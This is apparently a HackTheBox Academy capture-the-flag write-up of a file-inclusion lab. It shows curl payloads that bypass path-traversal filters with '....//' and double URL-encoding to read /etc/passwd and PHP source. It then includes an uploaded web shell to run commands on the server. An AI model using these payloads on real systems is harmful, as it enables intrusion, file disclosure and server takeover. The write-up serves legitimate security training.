# File Inclusion - Skills Assessment

**Platform:** HackTheBox Academy

**Difficulty:** Medium


<img width="897" height="216" alt="11" src="https://github.com/user-attachments/assets/a1417382-8d9e-4264-9f06-2aea2b3e354c" />

This machine demonstrates Local File Inclusion (LFI) using PHP wrappers to read source files and leak credentials, followed by a sudo misconfiguration for privilege escalation.

## Background / Scope
- **Target IP:** 83.136.251.67:41528
- **Scenario:** You have been contracted by Sumace Consulting Gmbh to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.
- **Goal:** Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.


<img width="1174" height="518" alt="12" src="https://github.com/user-attachments/assets/97723650-b89a-48a7-980f-5c5ea27e232d" />

## Web Enumeration

First of all, I've found `/apply.php` page, where I can upload any type of file


<img width="548" height="638" alt="13" src="https://github.com/user-attachments/assets/e58869a5-d8ee-42f8-805c-6a2ba8f17e2e" />

Let's what's happened if we try to intercept request from vulnerable upload page


<img width="1146" height="566" alt="14" src="https://github.com/user-attachments/assets/7db5adbc-8afe-4ecf-b0c9-d83309579d60" />

I didn't find any interest information after uploading the php file, but after uploading file we got to `/thanks.php` page


<img width="1110" height="513" alt="15" src="https://github.com/user-attachments/assets/068b180e-789d-4548-8bcc-78813b4727cc" />

I intercepted request on `/thanks.php` page and output of response showing up this page `/api/image.php?p=`

<img width="929" height="576" alt="16" src="https://github.com/user-attachments/assets/82e43755-d756-478a-8391-e91a2428bf81" />

Before this, I tried to find where my payloads been uploaded, but nothing was founded on `/uploads` page



<img width="774" height="410" alt="17" src="https://github.com/user-attachments/assets/7e642713-cdfc-4f18-aeca-5f39fd7ac604" />

Let's get back to our `/api/image` page.I've tried several LFI-payloads and find the server just replacing all my `../` with empty string.So I tried to bypass this filters with:

```bash
curl 'http://83.136.251.67:41528/api/image.php?p=....//....//....//....//....//....//....//etc/passwd'
```

<img width="566" height="408" alt="2" src="https://github.com/user-attachments/assets/5d1090e5-dfb7-4028-9608-63dffd748242" />

It looks like our payload worked properly.Let's move on


## Exploitation(Initial Access)

I used our LFI-vulnerability to find out where our web shell payload is.Then, I tried to read php files of this page and found many interesting things

First, I tried to `curl` to `/api/image.php` page
```text
─# curl 'http://83.136.251.67:41528/api/image.php?p=....//api/image.php'                                 
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>
```
The command `(isset($__GET["p"]` means there is LFI vulnerability with parameters `p`             

Then, I tried to `curl` to `/app/application.php` page

```text
─# curl 'http://83.136.251.67:41528/api/image.php?p=....//api/application.php'
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

The page shows up how our upload works.
`md5_file($tmp_name)` computes the MD5 hash of the uploaded file,then our file destination looks like `../uploads/<md5-hash>.php`

After, I checked the `/contact.php` page

<img width="697" height="396" alt="18" src="https://github.com/user-attachments/assets/340268fd-dcc0-4126-94e2-1f3c8a9fe0a8" />

This page shows up this page has an LFI vulnerability.Our user send parameter `region` via URL.
Then our script check, if there is `(.)` or `(/)` in `region` parameter:
- If there are - page will output the message an error `parameter contains invalid character(s)`
- If there aren't - page will take the value of the path ./uploads/<md5-hash>.php


It can be easily bypassed using double encoding for the `(.)` and `(/)`
    %252e for ‘.’ (%25 -> % , %2e->.)
    %252f for ‘/’ (%25 -> % , %2f->/)

First, let's try to compute MD5 hash of our file `shell.php`

```text
md5sum shell.php | cut -d ' ' -f1
c214a2fb80bab315fc328a5eff2892b5
```

Now we can exploit `/contact.php` page with LFI to get RCE:
```bash
curl "http://83.136.251.67:41528/contact.php?region=%252e%252e%252fuploads%252fc214a2fb80bab315fc328a5eff2892b5&cmd=id"
```

<img width="1138" height="617" alt="6" src="https://github.com/user-attachments/assets/8e697336-a6fb-4516-b805-994d41c0fd28" />

## Obtain the flag

I moved to the `/` directory to this what's our flag file name

```bash
curl "http://83.136.251.67:41528/contact.php?region=%252e%252e%252fuploads%252fc214a2fb80bab315fc328a5eff2892b5&cmd=ls%20/"
```
<img width="989" height="579" alt="7" src="https://github.com/user-attachments/assets/861c4875-833d-460d-994a-f7f9c6fc0290" />

Our flag was successfully found!


<img width="1126" height="475" alt="8" src="https://github.com/user-attachments/assets/113c822c-b184-426f-ae8b-a40958f220f6" />



